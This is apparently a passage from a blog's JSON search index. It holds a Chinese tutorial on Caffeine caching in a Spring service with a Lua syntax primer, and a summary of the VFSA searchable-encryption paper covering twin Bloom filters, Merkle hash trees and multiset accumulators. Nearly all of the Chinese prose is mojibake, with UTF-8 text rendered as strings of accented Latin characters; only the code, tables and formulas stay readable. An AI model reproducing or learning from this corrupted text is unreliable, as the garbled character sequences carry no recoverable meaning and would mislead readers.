defaultGF);\n}\n```\n\nCaffeineéœ€è¦æœ‰ç¼“å­˜çš„æ¸…é™¤ç­–ç•¥ï¼Œä¸ç„¶çš„è¯å†…å­˜æ€»ä¼šæœ‰è€—å°½çš„æ—¶å€™ã€‚Caffeineæä¾›äº†ä¸‰ç§ç¼“å­˜é©±é€ç­–ç•¥ï¼š\n\n- **åŸºäºå®¹é‡**ï¼šè®¾ç½®ç¼“å­˜çš„æ•°é‡ä¸Šé™\n\n  ```java\n  // åˆ›å»ºç¼“å­˜å¯¹è±¡\n  Cache<String, String> cache = Caffeine.newBuilder()\n      .maximumSize(1) // è®¾ç½®ç¼“å­˜å¤§å°ä¸Šé™ä¸º 1\n      .build();\n  ```\n\n- **åŸºäºæ—¶é—´**ï¼šè®¾ç½®ç¼“å­˜çš„æœ‰æ•ˆæ—¶é—´\n\n  ```java\n  // åˆ›å»ºç¼“å­˜å¯¹è±¡\n  Cache<String, String> cache = Caffeine.newBuilder()\n      // è®¾ç½®ç¼“å­˜æœ‰æ•ˆæœŸä¸º 10 ç§’ï¼Œä»æœ€åä¸€æ¬¡å†™å…¥å¼€å§‹è®¡æ—¶ \n      .expireAfterWrite(Duration.ofSeconds(10)) \n      .build();\n  \n  ```\n\n- **åŸºäºå¼•ç”¨**ï¼šè®¾ç½®ç¼“å­˜ä¸ºè½¯å¼•ç”¨æˆ–å¼±å¼•ç”¨ï¼Œåˆ©ç”¨GCæ¥å›æ”¶ç¼“å­˜æ•°æ®ã€‚æ€§èƒ½è¾ƒå·®ï¼Œä¸å»ºè®®ä½¿ç”¨ã€‚\n\n> **æ³¨æ„**ï¼šåœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œå½“ä¸€ä¸ªç¼“å­˜å…ƒç´ è¿‡æœŸçš„æ—¶å€™ï¼ŒCaffeineä¸ä¼šè‡ªåŠ¨ç«‹å³å°†å…¶æ¸…ç†å’Œé©±é€ã€‚è€Œæ˜¯åœ¨ä¸€æ¬¡è¯»æˆ–å†™æ“ä½œåï¼Œæˆ–è€…åœ¨ç©ºé—²æ—¶é—´å®Œæˆå¯¹å¤±æ•ˆæ•°æ®çš„é©±é€ã€‚\n\n### â·å®ç°JVMè¿›ç¨‹ç¼“å­˜\n\n#### 1.éœ€æ±‚\n\nåˆ©ç”¨Caffeineå®ç°ä¸‹åˆ—éœ€æ±‚ï¼š\n\n- æ ¹æ®idæŸ¥è¯¢å•†å“çš„ä¸šåŠ¡æ·»åŠ ç¼“å­˜ï¼Œç¼“å­˜æœªå‘½ä¸­æ—¶æŸ¥è¯¢æ•°æ®åº“\n- æ ¹æ®idæŸ¥è¯¢åº“å­˜çš„ä¸šåŠ¡æ·»åŠ ç¼“å­˜ï¼Œç¼“å­˜æœªå‘½ä¸­æ—¶æŸ¥è¯¢æ•°æ®åº“\n- ç¼“å­˜åˆå§‹å¤§å°ä¸º100\n- ç¼“å­˜ä¸Šé™ä¸º10000\n\n#### 2.å®ç°\n\né¦–å…ˆï¼Œæˆ‘ä»¬éœ€è¦å®šä¹‰ä¸¤ä¸ªCaffeineçš„ç¼“å­˜å¯¹è±¡ï¼Œåˆ†åˆ«ä¿å­˜å•†å“ã€åº“å­˜çš„ç¼“å­˜æ•°æ®ã€‚\n\nåœ¨item-serviceçš„`com.heima.item.config`åŒ…ä¸‹å®šä¹‰`CaffeineConfig`ç±»ï¼š\n\n```java\npackage com.heima.item.config\n\n@Configuration\npublic class CaffeineConfig {\n\n    @Bean\n    public Cache<Long, Item> itemCache(){\n        return Caffeine.newBuilder()\n                .initialCapacity(100)\n                .maximumSize(10_000)\n                .build();\n    }\n\n    @Bean\n    public Cache<Long, ItemStock> stockCache(){\n        return Caffeine.newBuilder()\n                .initialCapacity(100)\n                .maximumSize(10_000)\n                .build();\n    }\n}\n```\n\nç„¶åï¼Œä¿®æ”¹item-serviceä¸­çš„`com.heima.item.web`åŒ…ä¸‹çš„ItemControllerç±»ï¼Œæ·»åŠ ç¼“å­˜é€»è¾‘ï¼š\n\n```java\n@RestController\n@RequestMapping(\"item\")\npublic class ItemController {\n\n    @Autowired\n    private IItemService itemService;\n    @Autowired\n    private IItemStockService stockService;\n\n    @Autowired\n    private Cache<Long, Item> itemCache;\n    @Autowired\n    private Cache<Long, ItemStock> stockCache;\n    \n    // ...å…¶å®ƒç•¥\n    \n    @GetMapping(\"/{id}\")\n    public Item findById(@PathVariable(\"id\") Long id) {\n        //æ ¹æ®idæŸ¥è¯¢å•†å“çš„ä¸šåŠ¡æ·»åŠ ç¼“å­˜ï¼Œç¼“å­˜æœªå‘½ä¸­æ—¶æŸ¥è¯¢æ•°æ®åº“\n        return itemCache.get(id, key -> itemService.query()\n                .ne(\"status\", 3).eq(\"id\", key)\n                .one()\n        );\n    }\n\n    @GetMapping(\"/stock/{id}\")\n    public ItemStock findStockById(@PathVariable(\"id\") Long id) {\n        //æ ¹æ®idæŸ¥è¯¢åº“å­˜çš„ä¸šåŠ¡æ·»åŠ ç¼“å­˜ï¼Œç¼“å­˜æœªå‘½ä¸­æ—¶æŸ¥è¯¢æ•°æ®åº“\n        return stockCache.get(id, key -> stockService.getById(key));\n    }\n}\n```\n\n## â‘¢Luaè¯­æ³•å…¥é—¨\n\n### åˆè¯†Lua\n\nLua æ˜¯ä¸€ç§è½»é‡å°å·§çš„è„šæœ¬è¯­è¨€ï¼Œç”¨æ ‡å‡†Cè¯­è¨€ç¼–å†™å¹¶ä»¥æºä»£ç å½¢å¼å¼€æ”¾ï¼Œ å…¶è®¾è®¡ç›®çš„æ˜¯ä¸ºäº†åµŒå…¥åº”ç”¨ç¨‹åºä¸­ï¼Œä»è€Œä¸ºåº”ç”¨ç¨‹åºæä¾›çµæ´»çš„æ‰©å±•å’Œå®šåˆ¶åŠŸèƒ½ã€‚å®˜ç½‘ï¼šhttps://www.lua.org/\n\nLuaç»å¸¸åµŒå…¥åˆ°Cè¯­è¨€å¼€å‘çš„ç¨‹åºä¸­ï¼Œä¾‹å¦‚æ¸¸æˆå¼€å‘ã€æ¸¸æˆæ’ä»¶ç­‰ã€‚Nginxæœ¬èº«ä¹Ÿæ˜¯Cè¯­è¨€å¼€å‘ï¼Œå› æ­¤ä¹Ÿå…è®¸åŸºäºLuaåšæ‹“å±•ã€‚\n\n### HelloWorld\n\nCentOS7é»˜è®¤å·²ç»å®‰è£…äº†Luaè¯­è¨€ç¯å¢ƒï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥è¿è¡ŒLuaä»£ç ã€‚\n\n1ï¼‰åœ¨Linuxè™šæ‹Ÿæœºçš„ä»»æ„ç›®å½•ä¸‹ï¼Œæ–°å»ºä¸€ä¸ªhello.luaæ–‡ä»¶\n\n2ï¼‰æ·»åŠ ä¸‹é¢çš„å†…å®¹\n\n```lua\nprint(\"Hello World!\")  \n```\n\n### å˜é‡å’Œå¾ªç¯\n\n#### 1.æ•°æ®ç±»å‹\n\nLuaä¸­æ”¯æŒçš„å¸¸è§æ•°æ®ç±»å‹åŒ…æ‹¬ï¼š\n\n| æ•°æ®ç±»å‹ | æè¿°                                                         |\n| -------- | ------------------------------------------------------------ |\n| nil      | è¡¨ç¤ºä¸€ä¸ªæ— æ•ˆå€¼ï¼ˆåœ¨æ¡ä»¶è¡¨è¾¾å¼ä¸­ç›¸å½“äºfalseï¼‰ã€‚                |\n| boolean  | åŒ…å«ä¸¤ä¸ªå€¼ï¼šfalseå’Œtrue                                      |\n| number   | è¡¨ç¤ºåŒç²¾åº¦ç±»å‹çš„å®æµ®ç‚¹æ•°                                     |\n| string   | å­—ç¬¦ä¸²ç”±ä¸€å¯¹åŒå¼•å·æˆ–å•å¼•å·æ¥è¡¨ç¤º                             |\n| function | ç”± C  æˆ– Lua  ç¼–å†™çš„å‡½æ•°                                     |\n| table    | Lua ä¸­çš„è¡¨ï¼ˆtableï¼‰å…¶å®æ˜¯ä¸€ä¸ª\"å…³è”æ•°ç»„\"ï¼ˆassociative arraysï¼‰ï¼Œæ•°ç»„çš„ç´¢å¼•å¯ä»¥æ˜¯æ•°å­—ã€å­—ç¬¦ä¸²æˆ–è¡¨ç±»å‹ã€‚åœ¨  Lua  é‡Œï¼Œtable  çš„åˆ›å»ºæ˜¯é€šè¿‡\"æ„é€ è¡¨è¾¾å¼\"æ¥å®Œæˆï¼Œæœ€ç®€å•æ„é€ è¡¨è¾¾å¼æ˜¯{}ï¼Œç”¨æ¥åˆ›å»ºä¸€ä¸ªç©ºè¡¨ã€‚ |\n\nå¦å¤–ï¼ŒLuaæä¾›äº†type()å‡½æ•°æ¥åˆ¤æ–­ä¸€ä¸ªå˜é‡çš„æ•°æ®ç±»å‹ï¼š\n\n```lua\n> print(type(\"Hello world\")ï¼‰\nstring\n> print(type(10.4*3)ï¼‰\nnumber\n```\n\n#### 2.å£°æ˜å˜é‡\n\nLuaå£°æ˜å˜é‡çš„æ—¶å€™æ— éœ€æŒ‡å®šæ•°æ®ç±»å‹ï¼Œè€Œæ˜¯ç”¨localæ¥å£°æ˜å˜é‡ä¸ºå±€éƒ¨å˜é‡ï¼š\n\n```lua\n-- å£°æ˜å­—ç¬¦ä¸²ï¼Œå¯ä»¥ç”¨å•å¼•å·æˆ–åŒå¼•å·ï¼Œ\nlocal str = 'hello'\n-- å­—ç¬¦ä¸²æ‹¼æ¥å¯ä»¥ä½¿ç”¨ ..\nlocal str2 = 'hello' .. 'world'\n-- å£°æ˜æ•°å­—\nlocal num = 21\n-- å£°æ˜å¸ƒå°”ç±»å‹\nlocal flag = true\n```\n\nLuaä¸­çš„tableæ—¢å¯ä»¥ä½œä¸ºæ•°ç»„ï¼Œåˆå¯ä»¥ä½œä¸ºJavaä¸­çš„mapæ¥ä½¿ç”¨ã€‚æ•°ç»„å°±æ˜¯ç‰¹æ®Šçš„tableï¼Œkeyæ˜¯æ•°ç»„è§’æ ‡è€Œå·²ï¼š\n\n```lua\n-- å£°æ˜æ•°ç»„ ï¼Œkeyä¸ºè§’æ ‡çš„ table\nlocal arr = {'java', 'python', 'lua'}\n-- å£°æ˜tableï¼Œç±»ä¼¼javaçš„map\nlocal map =  {name='Jack', age=21}\n```\n\nLuaä¸­çš„æ•°ç»„è§’æ ‡æ˜¯ä»1å¼€å§‹ï¼Œè®¿é—®çš„æ—¶å€™ä¸Javaä¸­ç±»ä¼¼ï¼š\n\n```lua\n-- è®¿é—®æ•°ç»„ï¼Œluaæ•°ç»„çš„è§’æ ‡ä»1å¼€å§‹\nprint(arr[1])\n```\n\nLuaä¸­çš„tableå¯ä»¥ç”¨keyæ¥è®¿é—®ï¼š\n\n```lua\n-- è®¿é—®table\nprint(map['name'])\nprint(map.name)\n```\n\n#### 3.å¾ªç¯\n\nå¯¹äºtableï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨forå¾ªç¯æ¥éå†ã€‚ä¸è¿‡æ•°ç»„å’Œæ™®é€štableéå†ç•¥æœ‰å·®å¼‚ã€‚\n\néå†æ•°ç»„ï¼š\n\n```lua\n-- å£°æ˜æ•°ç»„ keyä¸ºç´¢å¼•çš„table\nlocal arr = {'java', 'python', 'lua'}\n-- éå†æ•°ç»„\nfor index,value in ipairs(arr) do\n    print(index, value) \nend\n```\n\néå†æ™®é€štable\n\n```lua\n-- å£°æ˜mapï¼Œä¹Ÿå°±æ˜¯table\nlocal map = {name='Jack', age=21}\n-- éå†table\nfor key,value in pairs(map) do\n   print(key, value) \nend\n```\n\n### æ¡ä»¶æ§åˆ¶ã€å‡½æ•°\n\n#### 1.å‡½æ•°\n\nå®šä¹‰å‡½æ•°çš„è¯­æ³•ï¼š\n\n```lua\nfunction å‡½æ•°å(argument1, argument2..., argumentn)\n    -- å‡½æ•°ä½“\n    return è¿”å›å€¼\nend\n```\n\nä¾‹å¦‚ï¼Œå®šä¹‰ä¸€ä¸ªå‡½æ•°ï¼Œç”¨æ¥æ‰“å°æ•°ç»„ï¼š\n\n```lua\nfunction printArr(arr)\n    for index, value in ipairs(arr) do\n        print(value)\n    end\nend\n```\n\n#### 2.æ¡ä»¶æ§åˆ¶\n\nç±»ä¼¼Javaçš„æ¡ä»¶æ§åˆ¶ï¼Œä¾‹å¦‚ifã€elseè¯­æ³•ï¼š\n\n```lua\nif(å¸ƒå°”è¡¨è¾¾å¼)\nthen\n   --[ å¸ƒå°”è¡¨è¾¾å¼ä¸º true æ—¶æ‰§è¡Œè¯¥è¯­å¥å— --]\nelse\n   --[ å¸ƒå°”è¡¨è¾¾å¼ä¸º false æ—¶æ‰§è¡Œè¯¥è¯­å¥å— --]\nend\n```\n\nä¸javaä¸åŒï¼Œå¸ƒå°”è¡¨è¾¾å¼ä¸­çš„é€»è¾‘è¿ç®—æ˜¯åŸºäºè‹±æ–‡å•è¯ï¼š\n\n| æ“ä½œç¬¦ | æè¿°                                                         | å®ä¾‹                    |\n| ------ | ------------------------------------------------------------ | ----------------------- |\n| and    | é€»è¾‘ä¸æ“ä½œç¬¦ã€‚  è‹¥ A ä¸º  falseï¼Œåˆ™è¿”å›  Aï¼Œå¦åˆ™è¿”å›  Bã€‚     | (A and B) ä¸º  falseã€‚   |\n| or     | é€»è¾‘æˆ–æ“ä½œç¬¦ã€‚  è‹¥ A ä¸º  trueï¼Œåˆ™è¿”å›  Aï¼Œå¦åˆ™è¿”å›  Bã€‚      | (A or B) ä¸º  trueã€‚     |\n| not    | é€»è¾‘éæ“ä½œç¬¦ã€‚ä¸é€»è¾‘è¿ç®—ç»“æœç›¸åï¼Œå¦‚æœæ¡ä»¶ä¸º  trueï¼Œé€»è¾‘éä¸º  falseã€‚ | not(A and B) ä¸º  trueã€‚ |\n\néœ€æ±‚ï¼šè‡ªå®šä¹‰ä¸€ä¸ªå‡½æ•°ï¼Œå¯ä»¥æ‰“å°tableï¼Œå½“å‚æ•°ä¸ºnilæ—¶ï¼Œæ‰“å°é”™è¯¯ä¿¡æ¯\n\n```lua\nfunction printArr(arr)\n    if not arr then\n        print('æ•°ç»„ä¸èƒ½ä¸ºç©ºï¼')\n    end\n    for index, value in ipairs(arr) do\n        print(value)\n    end\nend\n```\n\n## â‘£å®ç°å¤šçº§ç¼“å­˜\n\n## â‘¤ç¼“å­˜åŒæ­¥\n\n\n\n# 5.MQé«˜çº§\n\n\n\n# Sponsorâ¤ï¸\n\næ‚¨çš„æ”¯æŒæ˜¯æˆ‘ä¸æ–­å‰è¿›çš„åŠ¨åŠ›ï¼Œå¦‚æœæ‚¨æ„Ÿè§‰æœ¬æ–‡å¯¹æ‚¨æœ‰æ‰€å¸®åŠ©çš„è¯ï¼Œå¯ä»¥è€ƒè™‘æ‰“èµä¸€ä¸‹æœ¬æ–‡ï¼Œç”¨ä»¥ç»´æŒæœ¬åšå®¢çš„è¿è¥è´¹ç”¨ï¼Œæ‹’ç»ç™½å«–ï¼Œä»ä½ æˆ‘åšèµ·ï¼ğŸ¥°ğŸ¥°ğŸ¥°\n\n<table>\n  <tbody>\n     <tr>\n         <td style=\"text-align:center;\">æ”¯ä»˜å®</td>\n         <td style=\"text-align:center;\">å¾®ä¿¡</td>\n     </tr>\n   <tr>\n    <td style=\"text-align:center;\" ><img width=\"200\" src=\"https://jwt1399.top/medias/reward/alipay.png\"></td>    \n      <td style=\"text-align:center;\"><img width=\"200\" src=\"https://jwt1399.top/medias/reward/sponor_wechat.png\"></td>     \n  </tr>\n</tbody></table>\n","tags":["SpringCloud"],"categories":["Spring"]},{"title":"å¯æœç´¢åŠ å¯†ï¼šVFSAæ–¹æ¡ˆ","url":"/posts/44711.html","content":"\n**è®ºæ–‡åç§°ï¼šã€ŠVerifiable Fuzzy Multi-keyword Search over Encrypted Data with Adaptive Securityã€‹**\n\n- ä½œè€…ï¼šç«¥ç§‹äº‘; è‹—é“¶æ–Œ; ç†Šå¥; åˆ˜å¸ŒèŒ; é‡‘å…‰Â·é›·è’™å¾·Â·å‘¨; é‚“ç£Š\n- å•ä½ï¼šè¥¿å®‰ç”µå­ç§‘æŠ€å¤§å­¦\n- æœŸåˆŠï¼š[IEEE Transactions on Knowledge and Data Engineering](file:///Users/jianjian/Zotero/storage/U5DJKL6D/9714876.html)ã€CCF Aã€‘\n- æ—¶é—´ï¼š2022å¹´02æœˆ\n\n|  å¤šå…³é”®å­—  |  æ¨¡ç³Šæœç´¢  |   å¯éªŒè¯   |  åŠ¨æ€æ›´æ–°  | æ’å |\n| :--------: | :--------: | :--------: | :--------: | :--: |\n|     âœ…      |     âœ…      |     âœ…      |     âŒ      |  âŒ   |\n| **æ­£ç¡®æ€§** | **å®Œæ•´æ€§** | **å®‰å…¨æ€§** | **å¤æ‚åº¦** |      |\n|     âœ…      |     âœ…      |  IND-CKA2  |  O(log m)  |      |\n\n## 1ã€æ–¹æ¡ˆç®€ä»‹\n\nè®ºæ–‡æå‡ºäº†ä¸€ç§å…·æœ‰**è‡ªé€‚åº”å®‰å…¨æ€§çš„å¯éªŒè¯æ¨¡ç³Šå¤šå…³é”®å­—æœç´¢**ï¼ˆVFSAï¼‰æ–¹æ¡ˆã€‚VFSAé¦–å…ˆé‡‡ç”¨`å±€éƒ¨æ•æ„Ÿæ•£åˆ—(LSH)`å°†æ‹¼å†™é”™è¯¯å’Œæ­£ç¡®çš„å…³é”®å­—<u>æ•£åˆ—åˆ°ç›¸åŒçš„ä½ç½®</u>ï¼Œç„¶åä¸ºæ¯ä¸ªæ–‡æ¡£è®¾è®¡ä¸€ä¸ª`åŒå¸ƒéš†è¿‡æ»¤å™¨(TBF)`æ¥<u>å­˜å‚¨å’Œå±è”½æ–‡æ¡£ä¸­åŒ…å«çš„æ‰€æœ‰å…³é”®å­—</u>ï¼Œç„¶å`åŸºäºå›¾çš„å…³é”®å­—åˆ†åŒºç®—æ³•(GKP)`æ„å»ºç´¢å¼•æ ‘ä»¥å®ç°è‡ªé€‚åº”`äºšçº¿æ€§æ£€ç´¢`ï¼Œæœ€åå°†`Merkleå“ˆå¸Œæ ‘(MHT)`ç»“æ„ä¸`è‡ªé€‚åº”çš„å¤šé›†ç´¯åŠ å™¨(MSA)`ç›¸ç»“åˆï¼Œä»¥<u>æ£€æŸ¥æœç´¢ç»“æœçš„å®Œæ•´æ€§å’Œæ­£ç¡®æ€§</u>ã€‚é€šè¿‡å®‰å…¨åˆ†æè¡¨æ˜ï¼ŒVFSAåœ¨<u>IND-CKA2</u>æ¨¡å¼ä¸‹æ˜¯å®‰å…¨çš„ï¼Œå¹¶å®ç°äº†æŸ¥è¯¢èº«ä»½éªŒè¯ã€‚ä½¿ç”¨çœŸå®æ•°æ®é›†çš„å®éªŒè¯æ˜äº†VFSAçš„å®ç”¨æ€§ã€‚\n\n- é¦–å…ˆï¼Œä½¿ç”¨ **LSH** å’Œ **TBF** æ¥æ”¯æŒè‡ªé€‚åº”å®‰å…¨çš„æ¨¡ç³Šå¤šå…³é”®å­—æœç´¢\n- ç„¶åï¼Œä½¿ç”¨ **MHT** å’Œ  **GPK** æ„é€ ç´¢å¼•æ ‘ï¼Œè·å¾—æ¯”çº¿æ€§æœç´¢å¤æ‚åº¦æ›´å¿«çš„æœç´¢æ•ˆæœ\n- æœ€åï¼Œå°† **MHT** ä¸**MSA**ç›¸ç»“åˆï¼Œå®ç°ç»“æœçš„æ­£ç¡®æ€§å’Œå®Œæ•´æ€§éªŒè¯\n\n![](https://img.jwt1399.top/img/202209291228234.png)\n\n## 2ã€ä½¿ç”¨æŠ€æœ¯\n\n| æŠ€æœ¯                          | ä½œç”¨                               |\n| ----------------------------- | ---------------------------------- |\n| å±€éƒ¨æ•æ„Ÿæ•£åˆ—ï¼ˆLSHï¼‰           | å°†æ‹¼å†™é”™è¯¯çš„å…³é”®å­—æ•£åˆ—åˆ°ç›¸åŒçš„ä½ç½® |\n| åŒå¸ƒéš†è¿‡æ»¤å™¨ï¼ˆTBFï¼‰           | å­˜å‚¨å’Œå±è”½æ–‡æ¡£ä¸­åŒ…å«çš„æ‰€æœ‰å…³é”®å­—   |\n| Merkleå“ˆå¸Œæ ‘ï¼ˆMHTï¼‰           | æ­£ç¡®æ€§å’Œå®Œæ•´æ€§éªŒè¯                 |\n| è‡ªé€‚åº”å¤šé›†ç´¯åŠ å™¨ï¼ˆMSAï¼‰       | æ­£ç¡®æ€§å’Œå®Œæ•´æ€§éªŒè¯                 |\n| åŸºäºå›¾çš„å…³é”®å­—åˆ†åŒºç®—æ³•ï¼ˆGKPï¼‰ | æé«˜æœç´¢æ•ˆç‡                       |\n\n### â“µLocality Sensitive Hashing\n\nä¸»è¦ç”¨äºé«˜æ•ˆå¤„ç†æµ·é‡é«˜ç»´æ•°æ®çš„æœ€è¿‘é‚»é—®é¢˜ ï¼Œä½¿å¾— 2 ä¸ªç›¸ä¼¼åº¦å¾ˆé«˜çš„æ•°æ®ä»¥è¾ƒé«˜çš„æ¦‚ç‡æ˜ å°„æˆåŒä¸€ä¸ªhash å€¼ï¼Œè€Œä»¤ 2 ä¸ªç›¸ä¼¼åº¦å¾ˆä½çš„æ•°æ®ä»¥æä½çš„æ¦‚ç‡æ˜ å°„æˆåŒä¸€ä¸ª hash å€¼ã€‚\n\n------\n\n### â“¶Twin Bloom Filter\n\nTBF æ˜¯ BF çš„ä¸€ç§æ‰©å±•çš„æ•°æ®ç»“æ„ã€‚å…·ä½“æ¥è¯´ï¼ŒTBF æ˜¯ä¸€ä¸ªæœ‰ N ä¸ªåŒèƒèƒçš„ä½æ•°ç»„ï¼Œå…¶ä¸­æ¯ä¸ªåŒèƒèƒåŒ…å«ä¸¤ä¸ªå­˜å‚¨ç›¸åä½çš„å•å…ƒã€‚TBF å¯ä»¥æ©ç›–æ’å…¥ä½ç½®å’Œæ’å…¥å…ƒç´ çš„æ•°é‡ï¼Œå³å¯ä»¥åŒæ—¶å­˜å‚¨å’Œå±è”½å…³é”®å­—ä¿¡æ¯ï¼Œè€Œ BF åˆ™å®Œå…¨æš´éœ²å®ƒä»¬ã€‚TBF åŒ…å«å››ç§ç®—æ³•ï¼š\n\n![](https://img.jwt1399.top/img/202209272227152.png)\n\n> â¶$Setup(1^Î», k)â†’ \\{H_{key}, H\\}$\n\nk+1 é”®æ§å“ˆå¸Œå‡½æ•° $H_{key}$ å¯ä»¥ä½¿ç”¨ HMAC ç”Ÿæˆ ï¼Œ$ h_i(Â·) =HMAC (K_i, Â·) $ ï¼Œ $K_i$ æ˜¯çš„éšæœºç”Ÿæˆçš„å¯†é’¥ï¼Œé•¿åº¦ä¸º Î» ã€‚å“ˆå¸Œå‡½æ•° H å¯ä»¥ä½¿ç”¨éšæœºé¢„è¨€æœº $\\mathbb{H}:\\{0,1\\}^âˆ—â†’\\{0,1\\}^âˆ—$ ç”Ÿæˆï¼Œ$H =\\mathbb{H}(Â·)\\%2$\n\n$$\nH_{key} = {h_iï¼š\\{0,1\\}^âˆ—Â Ã— \\{0,1\\}^Î» â†’ \\{0,1\\}^âˆ—}\n\\\\\\\\\n Hï¼š\\{0,1\\}^âˆ—â†’[0,1]\n$$\n\n> â·$Initi(N, H_{key}, H, Î³)â†’B$\n\nç”Ÿæˆé•¿åº¦ä¸º N çš„ TBFï¼Œå¯¹äºæ¯ä¸ªåŒèƒèƒï¼Œé€‰æ‹©çš„å•å…ƒæ ¼å’Œæœªé€‰æ‹©çš„å•å…ƒæ ¼åˆ†åˆ«åˆå§‹åŒ–ä¸º 0 å’Œ 1\n$$\nB[Î¹][H(h_{k+1}(Î¹)âŠ•Î³)] = 0\n\\\\\\\\\\\nB[Î¹][1âˆ’H(h_{k+1}(Î¹)âŠ•Î³)] = 1, Î¹ âˆˆ [1,N]\n$$\nÎ³ æ˜¯ä¸€ä¸ªéšæœºæ•°ï¼Œç”¨äºæ¶ˆé™¤ä¸åŒ TBF ä¹‹é—´çš„ç›¸å…³æ€§ã€‚å¦åˆ™ï¼Œ$B_i$ å’Œ $B_j$ ä¸­ç¬¬ $Î¹$ ä¸ªåŒèƒèƒé€‰æ‹©çš„å•å…ƒæ ¼æ˜¯ç›¸åŒçš„ï¼Œè¿™é™ä½äº†éšæœºæ€§ï¼Œå¢åŠ äº†æ•°æ®æš´éœ²çš„é£é™©\n\n> â¸$Insert(B,  w, H_{key}, H, Î³) â†’ B$\n\nå¯¹é›†åˆ $W$ ä¸­çš„æ¯ä¸ªå…ƒç´  $w$ ï¼Œå°†å…¶æ•£åˆ—åˆ° k ä¸ªä½ç½® $B[h_1(w)]ï¼ŒÂ·Â·Â·Â·ï¼ŒB[h_k(w)]$ï¼Œç„¶åå¯¹è¿™ k ä¸ªä½ç½®é€‰ä¸­çš„å•å…ƒæ ¼è®¾ç½®ä¸º1ï¼Œæœªé€‰ä¸­çš„å•å…ƒæ ¼è®¾ç½®ä¸º 0\n$$\nh_i(w) = h_i(w)\\ mod \\ N,i âˆˆ [1,k]\n\\\\\\\\\nB[h_i(w)][H(h_{k+1}(h_i(w))âŠ•Î³)] = 1\n\\\\\\\\\nB[h_i(w)][1âˆ’H(h_{k+1}(h_i(w))âŠ•Î³)] = 0, iâˆˆ[1, k]\n$$\n\n> â¹$Check(B, w', Î³)â†’0/1$\n\nä¸ºäº†æµ‹è¯•ä¸€ä¸ªå…ƒç´  $w'$ æ˜¯å¦å­˜å‚¨åœ¨ $B$ ä¸­ï¼Œè®¡ç®—å¹¶æ£€æŸ¥ä¸‹å¼ã€‚å¦‚æœå®ƒå¯¹æ¯ä¸ª $i âˆˆ [1,k]$æˆç«‹ï¼Œé‚£ä¹ˆ $w'$ åœ¨ B ä¸­\n\n$$\nB[h_i(w')][H(h_{k+1}(h_i(w'))âŠ•Î³)]\\overset{\\text{?}}{=}1\n$$\n\n------\n\n### â“·Merkle hash tree\n\nMHT æ˜¯ä¸€ä¸ªç®€å•è€Œæœ‰æ•ˆçš„èº«ä»½éªŒè¯ç»“æ„æ¨¡å‹ï¼Œä»¥äºŒå‰å“ˆå¸Œæ ‘çš„å½¢å¼å‘ˆç°ã€‚MHT çš„å¶å­èŠ‚ç‚¹æ˜¯çœŸå®æ•°æ®å€¼çš„å“ˆå¸Œå€¼ï¼Œéå¶å­èŠ‚ç‚¹æ˜¯å·¦å³å­èŠ‚ç‚¹å“ˆå¸Œå€¼çš„ä¸²è”ã€‚\n$$\nh(h(left \\ child)||h(right \\ child))\n$$\n\n\nMHT å°±æ˜¯ç”¨æ¥åšå®Œæ•´æ€§æ ¡éªŒçš„ï¼Œ å…è®¸å¯¹å¤§è§„æ¨¡æ•°æ®çš„å†…å®¹è¿›è¡Œé«˜æ•ˆã€å®‰å…¨çš„éªŒè¯ã€‚ä½†æ˜¯ï¼ŒMHTæœ‰ä¸€ä¸ªèŠ‚ç‚¹å¹³è¡¡çš„ç¼ºç‚¹ï¼Œåœ¨æ’å…¥æˆ–åˆ é™¤ä¸€ç³»åˆ—è¯·æ±‚åå‘ç”Ÿã€‚å› æ­¤ï¼Œæ­¤æŠ€æœ¯ä¸ç›´æ¥é€‚ç”¨äºå¯è¯æ˜çš„æ•°æ®æ‹¥æœ‰æ–¹æ¡ˆã€‚\n\nä½†æ˜¯å°† MHT æ•°æ®ç»“æ„ï¼ˆMerkleï¼Œ1980ï¼‰å’ŒåŒçº¿æ€§èšåˆç­¾åï¼ˆBonehç­‰äººï¼Œ2003ï¼‰ç›¸ç»“åˆï¼Œå¯ä»¥è§£å†³ MHT ä¸­çš„èŠ‚ç‚¹å¹³è¡¡é—®é¢˜ã€‚å½“æ•°æ®æ‰€æœ‰è€…å†³å®šæ›´æ–°æ•°æ®å—æ—¶ï¼Œå¥¹ä¼šå°†æ–°æ•°æ®å—åŠå…¶èº«ä»½éªŒè¯æ ‡è®°å‘é€åˆ°äº‘ã€‚æ”¶åˆ°æ›´æ–°è¯·æ±‚åï¼Œäº‘æ‰§è¡Œæ›´æ–°æ“ä½œï¼Œé‡æ–°ç”Ÿæˆ MHT çš„æ ¹ï¼Œæ›´æ–°èšåˆå—æ ‡ç­¾å¹¶è¿”å›å·²ç­¾åçš„æ ¹ $sign_{pr} (root)$\n\n![](https://img.jwt1399.top/img/202210301636219.png)\n\nå‚è€ƒï¼š[Merkle Hash Tree | ScienceDirect Topics](https://www.sciencedirect.com/topics/computer-science/merkle-hash-tree)ã€[åŒçº¿æ€§é…å¯¹](https://blog.csdn.net/freedomhero/article/details/124943936?spm=1001.2014.3001.5502)ã€[åŒçº¿æ€§é…å¯¹- BLS ç­¾å](https://blog.csdn.net/freedomhero/article/details/125203129)\n\n------\n\n### â“¸adapted multiset accumulator\n\nè‡ªé€‚åº”å¤šé›†ç´¯åŠ å™¨ï¼ˆMSAï¼‰æ˜¯é€šè¿‡ä» CSP ä¸­é›†åˆ $T_i$ å¾—åˆ°çš„ï¼Œæ˜¯ä¸€ç§åŸºäºåŒçº¿æ€§å¯¹ $(p,\\mathbb{G},\\mathbb{G}_T, e, g)$ ä¸ºä¸¤ä¸ªé›†åˆ $T_1$ , $T_2$ çš„ä¸ç›¸äº¤æä¾›ç®€çŸ­è¯æ˜çš„æœ‰æ•ˆæ–¹æ³•ã€‚å…¶ä¸­$\\mathbb{G}$,$\\mathbb{G}_T$ æ˜¯ç´ æ•°é˜¶ $p$ çš„ä¸¤ä¸ªä¹˜æ³•å¾ªç¯ç¾¤ï¼Œ$g$ æ˜¯ $\\mathbb{G}$ çš„ç”Ÿæˆå™¨ï¼Œ$eï¼š\\mathbb{G}Ã—\\mathbb{G}â†’\\mathbb{G}_T$ æ˜¯ä¸€ä¸ªåŒçº¿æ€§æ˜ å°„ã€‚MSAç”±ä»¥ä¸‹å››ç§ç®—æ³•ç»„æˆï¼šÂ©\n\n> â¶$KGen(1^Î»)â†’\\{sk, pk\\}$\n\néšæœºé€‰æ‹©ä¸€ä¸ªå…ƒç´  